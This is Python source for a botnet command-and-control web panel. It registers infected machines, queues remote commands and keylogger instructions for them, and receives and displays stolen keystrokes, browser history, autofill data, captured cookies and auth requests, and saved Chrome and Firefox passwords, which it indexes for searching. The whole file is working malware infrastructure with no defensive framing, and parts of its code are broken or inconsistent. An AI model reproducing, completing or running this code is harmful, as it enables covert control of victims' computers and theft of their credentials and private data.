# -*- coding: utf-8 -*-

# ----- Imports -----
import cherrypy
import sqlite3
import time
import os
import re
import random
import string
import hashlib
import json
import sys
import glob
import chart
import codecs
import HTMLParser
import base64
import argparse
import shutil
import pygame
from itertools import izip
from termcolor import colored, cprint
from urllib2 import urlopen
from contextlib import closing
from threading import Thread
from dateutil.parser import parse
from time import gmtime, strftime
from pathlib import Path

#----------------------------------------------

from modules import makedir
from modules import log

import signal
#----------------------------------------------

# ----- Software vars -----
SYS_VERSION = "0.0.1"
BUFFER_BOT_REMOVED = []
ALL_BOTS = ""
# ------------------------

# ----- Web-Gui vars -----
COOKIE_NAME = "SPACENETSESSID"
SESSION_TIMEOUT = 1000	
PRETABLE = '''
 <table class="cp_bots">
 <tr><th class="cp_bots_th" onclick="sortTable(0)">OS</th><th class="cp_bots_th" onclick="sortTable(1)">Infected N°</th></tr>
'''
OSSUMMARY_LIST = '''
<tr class="cp_bots_tr1">
    <th style="text-align:left;font-weight:normal;">{{os}}</th>
    <th style="text-align:left">{{occurences}}</th>
  </tr>
'''
LOGIN_PASSWORD_FLAG = 0

LAST_CONNECTION_ADMIN = ""
LAST_IP_ADMIN = ""
# ------------------------


#----------------------------------------------


def signal_handler(signal, frame):
    SaveLog("Aborted.")
    os.system("service tor stop > /dev/null")
    os.system("pkill -9 python")
	


EXECUTEONSTART_FLAG = False
UPDATE_AGENT_FLAG   = False
SAVERESULT_FLAG     = False
EXECUTEDELAY_FLAG   = False
URL_MD   = ""
FNAME_MD = ""
DELAY = 0

session_cookie = None
last_session_activity = 0
switch = 0

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}

def SaveLog(action):
	log.save(str(action))

def file_is_empty(path):
    return os.stat(path).st_size==0

def get_cnt(lVals):
    global OSSUMMARY_LIST, PRETABLE
    output = ''
    output1 = ''
    output2 = ''

    d = dict(zip(lVals, [0] * len(lVals)))
    for x in lVals:
        d[x] += 1
	
	output1 += OSSUMMARY_LIST.replace("{{os}}",str(x))
	output2 += output1.replace("{{occurences}}",str(d[x]))
	

    output = str(PRETABLE) + str(output2) + "</table><br>"

    return output

def error_page(status, message, traceback, version):
    with open("html/error.html", "r") as f:
	SaveLog("SERVER ERROR : %s " %( status, status, message))
        html = f.read()
        return html % (status, status, message)

def worldgen():
	chart.create()

def find_between( s, first, last ):
     try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
     except ValueError:
        return None

def html_escape(text):
    return "".join(html_escape_table.get(c,c) for c in text)

def validate_botid(candidate):
    return re.match('^[a-zA-Z0-9\s\-_]+$', candidate) is not None


def query_DB(sql, params=()):
    conn = sqlite3.connect('main.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result


def exec_DB(sql, params=()):
    conn = sqlite3.connect('main.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()


def get_admin_password():
    result = query_DB("SELECT password FROM users WHERE name='admin'")
    if result:
        return result[0][0]
    else:
        return None


def set_admin_password(admin_password):
    password_hash = hashlib.sha256()
    password_hash.update(admin_password)
    exec_DB("DELETE FROM users WHERE name='admin'")
    exec_DB("INSERT INTO users VALUES (?, ?, ?)", (None, "admin", password_hash.hexdigest()))


def require_admin(func):
    def wrapper(*args, **kwargs):
        global session_cookie
        global last_session_activity
        global SESSION_TIMEOUT
        if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
            if time.time() - last_session_activity > SESSION_TIMEOUT:
                raise cherrypy.HTTPRedirect("/timeout")
            else:
                last_session_activity = time.time()
                return func(*args, **kwargs)
        else:
            raise cherrypy.HTTPRedirect("/login")
    return wrapper



class Main(object):
	
    @cherrypy.expose
    @require_admin
    def index(self):
		SaveLog("REQUEST : 300 [ Redirect ] | Redirected to Login.html.")
		cherrypy.HTTPRedirect("/cnc")
	
    @cherrypy.expose
    def login(self, password=''):
		global LOGIN_PASSWORD_FLAG , LAST_CONNECTION_ADMIN , LAST_IP_ADMIN

		admin_password = get_admin_password()
		if not admin_password:
			SaveLog("Admin account not set yet, ready to generate.")
			if password:
				set_admin_password(password)
				with open("html/AdminPasswordSet.html", "r") as f:
					SaveLog("REQUEST : 200 [ Ok ] | AdminPasswordSet.html.")
					html = f.read()
					return html
			else:
				with open("html/CreatePassword.html", "r") as f:
					SaveLog("REQUEST : 200 [ Ok ] | CreatePassword.html.")
					html = f.read()
					return html
		else:
			password_hash = hashlib.sha256()
			password_hash.update(password)

		if password == "":
			if LOGIN_PASSWORD_FLAG == 0:
				SaveLog("REQUEST : 200 [ Ok ] | New connection on the login.")
				LOGIN_PASSWORD_FLAG += 1
			else:
				pass

		else:
			if password_hash.hexdigest() == get_admin_password():
				global session_cookie
				session_cookie = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(64))
				cherrypy.response.cookie[COOKIE_NAME] = session_cookie
				global last_session_activity
				last_session_activity = time.time()
				SaveLog("REQUEST : 200 [ Ok ] | Admin logged in with password : %s " %  password)
				LAST_CONNECTION_ADMIN = str(time.ctime())
				LAST_IP_ADMIN = str(cherrypy.request.remote.ip)
				raise cherrypy.HTTPRedirect('cnc')
				
		global switch
		if switch == 0:
			with open("html/Login.html", "r") as f:
				SaveLog("REQUEST : 200 [ Ok ] | Login.html.")
				html = f.read()
				switch += 1
				return html
		else:
			with open("html/LoginEr.html", "r") as f:
				if password == "":
					SaveLog("REQUEST : 200 [ Ok ] | LoginEr.html.")
				else:
					SaveLog("REQUEST : 401 [ Unauthorized ] | Login failed with password : %s " % password)

				html = f.read()
				return html
	
    @cherrypy.expose
    def disconnect(self):
	SaveLog("Exiting User.")
        session_cookie = None
        cherrypy.response.cookie[COOKIE_NAME] = ''
        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
        with open("html/Disconnect.html", "r") as f:
		SaveLog("REQUEST : 200 [ Ok ] | Disconnect.html.")
                html = f.read()
                return html

    @cherrypy.expose
    def timeout(self):
	SaveLog("Timeout Session.")
        session_cookie = None
 	cherrypy.response.cookie[COOKIE_NAME] = ''
        cherrypy.response.cookie[COOKIE_NAME]['expires'] = 0
        with open("html/Timeout.html", "r") as f:
		SaveLog("REQUEST : 408 [ Timeout ] | Timeout.html.")
                html = f.read()
                return html

    @cherrypy.expose
    @require_admin
    def passchange(self, password=''):
		SaveLog("REQUEST : 200 [ Ok ] | Admin password updated.")
		if password:
				set_admin_password(password)
				with open("html/AdminPasswordSet.html", "r") as f:
					SaveLog("REQUEST : 200 [ Ok ] | AdminPasswordSet.html.")
					html = f.read()
					return html
                
		else:
				SaveLog("REQUEST : 200 [ Ok ] | CreatePassword.html.")
				with open("html/CreatePassword.html", "r") as f:
					html = f.read()
					return html


class CNC(object):

    argc_buffer = "null"

    
    @cherrypy.expose
    @require_admin
    def index(self):
		global ALL_BOTS

		try:
			os.remove("TempDir/tmpLocs.txt")
			os.remove("TempDir/tmpLocs.csv")
		except:
			pass

		SaveLog("REQUEST : 200 [ Ok ] | Overview.html")
		bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")

		ALL_BOTS = bot_list
		output = ""
		counter = 0
		online  = 0
		commands = 0
		offline = 0
		lst_conn = ""
		
		all_cmds = query_DB('SELECT * FROM commands ORDER BY date DESC')
		for cmd in all_cmds :
			commands += 1
		
		if not bot_list :
			loc = "none"
			cc = "nn"	
			chart.run(loc,cc)
			lst_conn = "-"

		for bot in bot_list:
			counter += 1
			ip = bot[2]
			
			if counter == 1:
				lst_conn = str(time.ctime(bot[1]))
			
			out_file = open("TempDir/BotIps.txt","a")
			out_file.write("%s\n" % ip)
			out_file.close()

			if time.time() - 30 < bot[1]:
				online += 1

			if '192.168' in ip or '127.0' in ip:
				loc = "Italy"
				cc = "it"
				cc = cc.lower()
				chart.run(loc,cc)
			else:
				#check ip location
				url = ('http://freegeoip.net/json/%s' %ip)
				try:
					with closing(urlopen(url)) as response:
						 location = json.loads(response.read())
						 loc = location['country_name']
						 cc = location['country_code']	
						 cc = cc.lower()
						 chart.run(loc,cc)
				except:
					print("Location could not be determined automatically")

		thread = Thread(target = worldgen)
		thread.start()	
		thread.join()

		with open("html/Overview.html", "r") as f:

				html = f.read()
				
				offline = counter - online
				
				
					
				html = html.replace("{{bot_table}}", output)
				html = html.replace("{{bots}}", str(counter))
				html = html.replace("{{bats}}", str(online))
				html = html.replace("{{offs}}", str(offline))
				html = html.replace("{{cmds}}", str(commands))
				html = html.replace("{{lst}}", str(lst_conn))


		with open("TempDir/tmpLocs.txt") as f:
			for line in f:
				if "none" in line:
					pass
				else:
					country = line.split(":")[0]
					country = country.replace(" ","")
					botsnumber = line.split(":")[1]

					output += '''
					 <tr>
						<th><img src="/static/flags/%s.png" alt="Flag" title="%s" style="all:unset;width:24px;height:24px;vertical-align:middle"></th>
						<td>%s</td>
						<td>%s</td>
					  </tr>
					''' % (country , country , country, botsnumber)

			if output == "":
					output = "No bots registered."
			html = html.replace("{{output}}", output)


			try:
				os.remove("TempDir/tmp{{botid}}.txt")
			except:	
				pass
		return html

    @cherrypy.expose
    @require_admin
    def account(self):
			global LAST_CONNECTION_ADMIN, LAST_IP_ADMIN
			
			with open("html/Account.html", "r") as f:
				html = f.read()
				html = html.replace("{{time}}", LAST_CONNECTION_ADMIN)
				html = html.replace("{{ip}}", LAST_IP_ADMIN)
				
				url = ('http://freegeoip.net/json/%s' % LAST_IP_ADMIN)
				if "192.168" in LAST_IP_ADMIN:
					html = html.replace("{{geo}}", "Italy")
				else:
					try:
						with closing(urlopen(url)) as response:
							 location = json.loads(response.read())
							 loc = location['country_name']
							 html = html.replace("{{geo}}", loc)
					except:
						print("Location could not be determined automatically")
					
				return html
				
				
    @cherrypy.expose
    @require_admin
    def list(self):
	global ALL_BOTS
	
	try:
		os.remove("TempDir/tmpLocs.txt")
		os.remove("TempDir/tmpLocs.csv")
	except:
		pass
	
	SaveLog("REQUEST : 200 [ Ok ] | List.html")
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
	ALL_BOTS = bot_list
        output = ""
        counter = 0
    
	online  = 0
        for bot in bot_list:
	    counter += 1
	    ip = bot[2]
	    out_file = open("TempDir/BotIps.txt","a")
	    out_file.write("%s\n" % ip)
	    out_file.close()
	    
	    
	    if '192.168' in ip or '127.0' in ip:
				loc = "Italy"
				cc = "it"
				cc = cc.lower()
				chart.run(loc,cc)
	    else:
		#check ip location
		url = ('http://freegeoip.net/json/%s' %ip)
		try:
			with closing(urlopen(url)) as response:
				 location = json.loads(response.read())
				 loc = location['country_name']
				 cc = location['country_code']	
				 cc = cc.lower()
				 chart.run(loc,cc)
		except:
			 print("Location could not be determined automatically")

            output += '''<tr><td><a href="bot?botid=%s" class="cp_botid">%s</a><a href="info?botid=%s"><img src="/static/images/info.png" alt="Info" title="Info" class="info"></a></td><td>%s</td><td>%s</td><td>%s</td><td><input type="checkbox" id="%s" class="botid" /></td><td VALIGN = Middle Align = Left><img src="/static/flags/%s.png" alt="Flag" title="%s"></td></tr>''' % ( bot[0],bot[0],bot[0], "Online" if time.time() - 30 < bot[1]  else time.ctime(bot[1]), bot[2], bot[3],bot[0], loc , loc)
        
	    if "Online" in output:
		output = output.replace("<td>Online</td>","<td style='color:rgb(66, 134, 244);'>Online</td>")
		online += 1

	
        with open("html/List.html", "r") as f:
            html = f.read()
            html = html.replace("{{bot_table}}", output)
	    html = html.replace("{{bots}}", str(counter))
	
	    try:
		os.remove("TempDir/tmp{{botid}}.txt")
	    except:	
		pass
            return html

    @cherrypy.expose
    @require_admin
    def bot(self, botid):
	SaveLog("REQUEST : 200 [ Ok ] | Bot.html -> %s " % botid)
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("html/Bot.html", "r") as f:
	    # Scrive un file.
	    out_file = open("TempDir/tmp{{botid}}.txt","w")
	    out_file.write(botid)
	    out_file.close()

            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html
		
    @cherrypy.expose
    @require_admin
    def info(self, botid):
        SaveLog("REQUEST : 200 [ Ok ] | Info.html -> %s " % botid)
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("html/Info.html", "r") as f:

            html = f.read()
            html = html.replace("{{botid}}", botid)
			
            with open("DumpDir/%s/info.txt"%botid, "r") as e:
				buffer = e.read()
				buffer = buffer.replace("--", "<tr>")
				buffer = buffer.replace("++", "</tr>")
				buffer = buffer.replace("::", "<td>")
				buffer = buffer.replace(";;", "</td>")
				html = html.replace("{{infor}}", buffer)
            return html

 

    @cherrypy.expose
    @require_admin
    def ossummary(self):
	SaveLog("REQUEST : 200 [ Ok ] | OsSummary.html")
	bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        output = ""
	buffer_os = ""
        counter = 0
	osinf = []

        for bot in bot_list:
	    osinf.append(bot[3])
	    counter+=1


        with open("html/OsSummary.html", "r") as f:
		html = f.read()
		html = html.replace("{{bots}}",str(counter))
		if get_cnt(osinf) != "":
			html = html.replace("{{ostable}}",str(get_cnt(osinf)))
		else :
			html = html.replace("{{ostable}}","No Os Infected Yet!")
            	return html

    @cherrypy.expose
    @require_admin
    def passset(self):
		with open("html/AdminPasswordSet1.html", "r") as f:
					SaveLog("REQUEST : 200 [ Ok ] | AdminPasswordSet1.html.")
					html = f.read()
					return html


    @cherrypy.expose
    @require_admin
    def keylogger(self, botid):
	SaveLog("REQUEST : 200 [ Ok ] | Keylogger.html -> %s " % botid )
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        with open("html/KeyLog.html", "r") as f:
		html = f.read()

		target0 = "DumpDir/%s/Keystrokes.txt" % botid
		my_file = Path(target0)
		if my_file.is_file():
			
			with open(target0, "r") as d:

				if file_is_empty(target0)== True:
					html = html.replace("{{KL}}","No Keystrokes Stored.")	
				else:
					
					switch = False


			    		for line in d:
						CURRENT_WINDOW = ''
						TIME_WINDOW    = ''
						STROKES        = ''
						tabletorpl     = ''
						tdpreset = '''<table class="table_info"><tr>
						    <th>Window Title Name</th>
						    <td>{{WTN}}</td>
						  </tr>
						 <tr>
						    <th>Time</th>
						    <td>{{TM}}</td>
						  </tr><tr>
						    <th>Keys Pressed</th>
						    <td>{{STK}}</td>
						  </tr></table><br><br>{{END}}'''

						if line.startswith("["):
							CURRENT_WINDOW = line.split("]")[0]
							CURRENT_WINDOW = CURRENT_WINDOW.replace("[","")
							tabletorpl = tdpreset.replace("{{WTN}}",CURRENT_WINDOW)


							TIME_WINDOW    = line.split("@", 2)[2]
							TIME_WINDOW    = TIME_WINDOW.split("|||")[0]
							tabletorpl = tabletorpl.replace("{{TM}}",TIME_WINDOW)

							STROKES        = line.split("|||")[1]	

							tabletorpl = tabletorpl.replace("{{STK}}",STROKES)

							if switch == True:
								html = html.replace("{{END}}",tabletorpl)
							else:
								html = html.replace("{{KL}}",tabletorpl)
								switch = True
							switch = True
						else:
							pass
		else:
			html = html.replace("{{KL}}","No Keystrokes Stored.")	

			
	
		html = html.replace("{{botid}}", botid)
		html = html.replace("{{END}}", "")
		return html

    @cherrypy.expose
    @require_admin
    def dbpass(self,*argv):	
		    SaveLog("REQUEST : 200 [ Ok ] | Database.html")
		    with open("html/DbPass.html", "r") as f:
		    	html = f.read()
			try:
		    		file = open("TempDir/tmp.txt", "r") 
		    		buffer_ = file.read() 
				if buffer_ == "":
					buffer_ = "No matches found for this research."	

				buffer_ = buffer_.replace("\n","<br>")
				buffer_ = buffer_.replace("Website:","<b>Website</b>:")
				buffer_ = buffer_.replace("Username:","<b>Username</b>:")
				buffer_ = buffer_.replace("Password:","<b>Password</b>:")
				buffer_ = buffer_.replace("DumpDir/","")

			except :
				buffer_ = ""

		    	html = html.replace("{{results}}",buffer_) 
			try:
				os.remove("TempDir/tmp.txt")
			except:	
				pass
		    	return html	




    @cherrypy.expose
    @require_admin
    def chrome(self, botid):
	SaveLog("REQUEST : 200 [ Ok ] | Chrome.html -> %s " % botid)
	html = ''
	krc  = ''
	hic  = ''
	afc  = ''
	mln  = 1000

	with open("html/Chrome.html", "r") as f:
		html = f.read()



		target0 = "DumpDir/%s/KRC.txt" % botid
		target1 = "DumpDir/%s/HIC.txt" % botid
		target2 = "DumpDir/%s/AFC.txt" % botid

		try:
			max_counter0 = 0
			max_counter1 = 0
			max_counter2 = 0

			html = html.replace("{{botid}}",botid)
			f = codecs.open(target0, encoding='utf-8')
			for line in f:
			    if max_counter0 == mln:
				krc += "<br><u>FILE TOO BIG ! TO AVOID BROWSER CRASH YOU CAN SEE ONLY THE FIRST %s LINES , CHECK THE FILE %s TO SEE THE FULL DATA.</u>" % (str(mln),target0)
				break
			    krc += repr(line)
			    max_counter0 += 1
			krc = krc.replace("&apos;","'")
			krc = krc.replace("\\n'","<br>")
			krc = krc.replace("u'","")
			html = html.replace("{{KRC}}",krc)

	
			h = codecs.open(target1, encoding='utf-8')
			for line in h:
			    if max_counter1 == mln:
				hic += "<br><u>FILE TOO BIG ! TO AVOID BROWSER CRASH YOU CAN SEE ONLY THE FIRST %s LINES , CHECK THE FILE %s TO SEE THE FULL DATA.</u>" % (str(mln),target1)
				break
			    hic += repr(line)
			    max_counter1 += 1
			hic = hic.replace("&apos;","'")
			hic = hic.replace("u'","")
			hic = hic.replace("\\n'","<br>")
			html = html.replace("{{HIC}}",hic)

			y = codecs.open(target2, encoding='utf-8')
			for line in y:
			    if max_counter2 == mln:
				afc += "<br><u>FILE TOO BIG ! TO AVOID BROWSER CRASH YOU CAN SEE ONLY THE FIRST %s LINES , CHECK THE FILE %s TO SEE THE FULL DATA.</u>" % (str(mln),target2)
				break
			    afc += repr(line)
			    max_counter2 += 1

			afc = afc.replace("&apos;","'")
			afc = afc.replace("u'","")
			afc = afc.replace("\\n'","<br>")
			afc = afc.replace("&quot;",'"')
			html = html.replace("{{AFC}}",HTMLParser.HTMLParser().unescape(afc))
		except:
			html = html.replace("{{KRC}}","Nothing Here.")
			html = html.replace("{{HIC}}","Nothing Here.")
			html = html.replace("{{AFC}}","Nothing Here.")

	return html	


    @cherrypy.expose
    @require_admin
    def getcache(self, botid):	
		SaveLog("REQUEST : 200 [ Ok ] | Cache.html => %s" % botid)
		with open("html/Cache.html", "r") as f:
			html = f.read()
			
		final_html = ''
		filepath = "DumpDir/%s/getauth.txt" % botid

		try:
		 	with open(filepath,"r") as t:
				everything = t.read()
				
				if everything != "":
					for item in everything.split("]]]==="):
						if "===[[[" in item:
							TABLE_PRESET = '''<table>
							 <tr>
								<th>Request Type:</th>
								<td>{{Request-Type}}</td>
							  </tr>
							 <tr>
								<th>Host-Website:</th>
								<td style="color:red">{{Host}}</td>
							  </tr>
							<tr>
								<th>User Agent:</th>
								<td>{{User-Agent}}</td>
							  </tr>
							<tr>
								<th>Language:</th>
								<td>{{Language}}</td>
							  </tr>

							<tr>
								<th>Hour:</th>
								<td>{{Time}}</td>
							  </tr>
							<tr>
								<th>Cookie:</th>
								<td>{{Cookie}}</td>
							  </tr>
								<th>Payload-Credentials:</th>
								<td style="color:red">{{Payload}}</td>
							  </tr>
							</table><br>'''

							TABLE_UNSORTED_PACKET = '''<table>
							 <tr>
								<th> ( Unsorted Packet ) Packet Content:</th>
								<td>{{pkt}}</td>
							  </tr>

							</table><br>'''

							buffer = item [ item.find("===[[[")+len("===[[[") : ]


							COMPLETE_PACKET = ''
							REQUEST_TYPE    = ''
							HOST            = ''		
							USER_AGENT      = ''
							LANGUAGE        = ''
							HOUR            = ''
							COOKIE          = ''
							PAYLOAD         = ''


							COMPLETE_PACKET = find_between( buffer, "((", "))" )
							REQUEST_TYPE    = COMPLETE_PACKET.split(" ")[0]


							HOST            = find_between( COMPLETE_PACKET , "Host:", "\n" )
							HOST            = HOST.replace(" ","")		


							USER_AGENT      = find_between( COMPLETE_PACKET , "User-Agent:", "\n" )
							USER_AGENT      = USER_AGENT.replace(" ","")


							LANGUAGE        = find_between( COMPLETE_PACKET , "Accept-Language:", "," )
							LANGUAGE        = LANGUAGE.replace(" ","")


							HOUR            = COMPLETE_PACKET.split("{{{")[1]


							COOKIE          = find_between( COMPLETE_PACKET , "Cookie:", "auth_key" )
							COOKIE          = COOKIE.replace(" ","")


							PAYLOAD         = find_between( COMPLETE_PACKET , "auth_key=" , "{{{")



							TABLE_PRESET = TABLE_PRESET.replace("{{Request-Type}}",REQUEST_TYPE)
							TABLE_PRESET = TABLE_PRESET.replace("{{Host}}",HOST)
							TABLE_PRESET = TABLE_PRESET.replace("{{User-Agent}}",USER_AGENT)
							TABLE_PRESET = TABLE_PRESET.replace("{{Language}}",LANGUAGE)
							TABLE_PRESET = TABLE_PRESET.replace("{{Time}}",HOUR)
							TABLE_PRESET = TABLE_PRESET.replace("{{Cookie}}",COOKIE)
							TABLE_PRESET = TABLE_PRESET.replace("{{Payload}}",PAYLOAD)

							final_html += TABLE_PRESET

						if PAYLOAD == '':
							try:
								TABLE_PRESET = ''
								TABLE_PRESET = TABLE_UNSORTED_PACKET.replace("{{pkt}}",COMPLETE_PACKET)

							except:
								pass


		except:
			final_html = 'File getauth.txt not found!'
			html = html.replace("{{botid}}",botid)


		kwords = ['password','username','pwd','usr','pass','user','email','referer']
		try:
			for word in kwords:
				try:
					TABLE_PRESET = TABLE_PRESET.replace(word,'<span style="color:black;background-color:#f4eb42;"><b>%s</b></span>'%word)
				except:
					pass

			final_html = TABLE_PRESET
		except:
			pass

		html = html.replace("{{Table_preset}}",final_html)

		return html

		

		    

 

class API(object):

    @cherrypy.expose
    @require_admin
    def passupdate_setting(self, password=''):
		SaveLog("REQUEST : 200 [ Ok ] | Admin password updated.")
		set_admin_password(password)


		
		
		
    @cherrypy.expose
    @require_admin
    def removebot(self, botid):
	global BUFFER_BOT_REMOVED
	cmd = "removeme"

        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
	SaveLog("Removing Bot.")
	exec_DB("DELETE FROM bots WHERE name=?",(html_escape(botid),))
	BUFFER_BOT_REMOVED.append(botid)

    @cherrypy.expose
    @require_admin
    def klog(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
	exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), "keylogger %s" % cmd , False, html_escape(botid)))

	
	

    @cherrypy.expose
    def pop(self, botid, sysinfo, ip):
        global BUFFER_BOT_REMOVED

        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
		if botid in BUFFER_BOT_REMOVED :
			SaveLog("Bot Removed Tried To Connect: botid => %s - sysinfo => %s - ip => %s" % (botid, sysinfo, ip))
			BUFFER_BOT_REMOVED = []
		else:
			exec_DB("INSERT INTO bots VALUES (?, ?, ?, ?)", (html_escape(botid), time.time(), ip, html_escape(sysinfo)))
			SaveLog("Storing New Bot : botid => %s - sysinfo => %s - ip => %s" % (botid, sysinfo, ip))
			if not os.path.exists("DumpDir/%s" % botid):
	    		    os.makedirs("DumpDir/%s" % botid)
		
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), "&gt; " + cmd[0][2], html_escape(botid)))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def worldupdate(self):
	thread = Thread(target = worldgen)
	thread.start()	
	thread.join()

   
		
	


    @cherrypy.expose
    def report(self, botid, output):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
	if "{{info}}" in html_escape(output):
		md_buffer = html_escape(output).split("{{info}}")[1]
		out_file = open("DumpDir/%s/info.txt"% html_escape(botid),"w")
		md_buffer = md_buffer.replace("{{info}}","")
		out_file.write(md_buffer)
		out_file.close()

	elif "MD-STATUS" in html_escape(output):
		md_buffer = html_escape(output).split(":")[1]
		filename = "Logs/MassDownloadReport.txt"
		out_file = open(filename,"a")
		current_time = strftime("[%H-%M-%S_%d-%m-%Y]", gmtime())
		texttowrite= str(current_time) + "\t[ " + str(html_escape(botid)) + " ] [ MD-STATUS:%s - OK ]\n" % str(md_buffer)
		out_file.write(texttowrite)
		out_file.close()

	
	elif "{{KEYLOGS}}" in html_escape(output):
		out_file = open("DumpDir//%s//Keystrokes.txt" % html_escape(botid) ,"w")
		buffer_html = ''
		buffer_html = html_escape(output).replace("{{KEYLOGS}}","")
		out_file.write(buffer_html)
		out_file.close()
		SaveLog("Updating Keystrokes.")

	elif "KRC{{{" in html_escape(output):
		if not os.path.exists("DumpDir//%s" % html_escape(botid)):
    			os.makedirs("DumpDir//%s"% html_escape(botid))
		out_file = open("DumpDir//%s//KRC.txt" % html_escape(botid) ,"w")
		buffer_html = ''
		buffer_html = html_escape(output).replace("KRC{{{","")
		out_file.write(buffer_html.encode('utf-8'))
		out_file.close()
		SaveLog("Storing Chrome Data => Keywords Searched.")

	elif "HIC{{{" in html_escape(output):
		out_file = open("DumpDir//%s//HIC.txt" % html_escape(botid) ,"w")
		buffer_html = ''
		buffer_html = html_escape(output).replace("HIC{{{","")
		out_file.write(buffer_html.encode('utf-8'))
		out_file.close()
		SaveLog("Storing Chrome Data => History.")
	
	elif "AFC{{{" in html_escape(output):
		out_file = open("DumpDir//%s//AFC.txt" % html_escape(botid) ,"w")
		buffer_html = ''
		buffer_html = html_escape(output).replace("AFC{{{","")
		out_file.write(buffer_html.encode('utf-8'))
		out_file.close()
		SaveLog("Storing Chrome Data => Autofill Fields.")

	elif "{{getrequestauth}}" in html_escape(output):
		out_file = open("DumpDir//%s//getauth.txt" % html_escape(botid) ,"a")
		buffer_html = ""
		buffer_html = html_escape(output).replace("{{getrequestauth}}","")
		out_file.write("===[[[((" + buffer_html + "))]]]===\n\n")
		out_file.close()
		SaveLog("Storing auth GET request.")

	elif "CHROME PASSWORDS :" in html_escape(output):
		
		buffer_html = ""
		buffer_html = html_escape(output).replace("CHROME PASSWORDS :","")
		buffer_html = buffer_html.replace("&apos;" , "'")
		out_file = open("DumpDir//%s.txt"% html_escape(botid),"w")
		out_file.write("\nCHROME PASSWORDS : =================================================================================\n")
		out_file.write(buffer_html)
		out_file.close()
		SaveLog("Storing Chrome Passwords.")

	elif "FIREFOX PASSWORDS :" in html_escape(output):
		buffer_html = ""
		buffer_html = html_escape(output).replace("FIREFOX PASSWORDS :","")
		buffer_html = buffer_html.replace("&apos;" , "'")
		out_file = open("DumpDir//%s-firefox.txt" % html_escape(botid),"w")
		out_file.write("\nFIREFOX PASSWORDS : =================================================================================\n")
		out_file.write(buffer_html)
		out_file.close()
		SaveLog("Storing Firefox Passwords.")
	else:
		exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), html_escape(output), html_escape(botid)))

		

    @cherrypy.expose
    @require_admin
    def push(self, botid, cmd):
        if not validate_botid(botid):
            raise cherrypy.HTTPError(403)
	exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, html_escape(botid)))
	SaveLog("REQUEST : 200 [ Ok ] | push.html")
        if "upload" in cmd:
            uploads = cmd[cmd.find("upload"):]
            up_cmds = [i for i in uploads.split("upload ") if i]
            for upload in up_cmds:
                end_pos = upload.find(";")
                while end_pos > 0 and cmd[end_pos - 1] == '\\':
                    end_pos = cmd.find(";", end_pos + 1)
                upload_filename = upload
                if end_pos != -1:
                    upload_filename = upload_filename[:end_pos]
                pending_uploads.append(os.path.basename(upload_filename))
        if cmd.startswith("screenshot"):
            pending_uploads.append("screenshot")


    @cherrypy.expose
    @require_admin
    def sortKW(self, keyword):
	SaveLog("Request Password DB => Sorting By KeyWord : %s " % keyword)
	argc_buffer = ""
	index_result = 0
	list_of_files = glob.glob('DumpDir/*.txt')
	if not list_of_files:
			out_file = open("TempDir/tmp.txt","w")
			out_file.write("")
			out_file.close()
	for fileName in list_of_files:
        	data = open(fileName).readlines()
		for i in range(len(data)):
				 if keyword in data[i]: 
					    if "," in data[i]:
								argc_buffer = data[i]
					    else:

						    website = data[i].split("Website:")[1]
						    usr = data[i+2].split("Username:")[1]	
						    pwd = data[i+4].split("Password:")[1]
						    
						    
						    argc_buffer   += "--[ Result <b>%s</b> in <b>%s</b>\n\n" % (str(index_result),str(fileName))
						    argc_buffer   += "<b>Website  </b>: " + website.rstrip() + "\n"
						    argc_buffer   += "<b>Username </b>: " + usr.rstrip() +"\n"
						    argc_buffer   += "<b>Password </b>: " + pwd.rstrip() +"\n\n"
						    index_result += 1

				 out_file = open("TempDir/tmp.txt","w")
				 out_file.write(argc_buffer)
				 out_file.close()
				 

		data.close()
		
    @cherrypy.expose
    @require_admin
    def sortIP(self, ip):	
	try:
		write_buffer = ''	
		write_buffer0 = ''
		file = open('DumpDir/%s.txt' %ip, 'r') 
		write_buffer += "--[ Results in <b>%s</b> \n\n" % ip
		write_buffer_0 = file.read()
		write_buffer_0 = write_buffer_0.replace("[*] All Firefox Passwords Dumped .","")

		write_buffer_0 = write_buffer_0.replace("Website:","<b>Website</b>:")
		write_buffer_0 = write_buffer_0.replace("Username:","<b>Username</b>:")
		write_buffer_0 = write_buffer_0.replace("Password:","<b>Website</b>:")

		write_buffer += write_buffer_0	 
	   	out_file = open("TempDir/tmp.txt","w")
		out_file.write(write_buffer)
		out_file.close()
		SaveLog("Request Password DB => Sorting By IP : %s " % ip)
	except:
		SaveLog("Error : Sorting by IP , No File Found.")

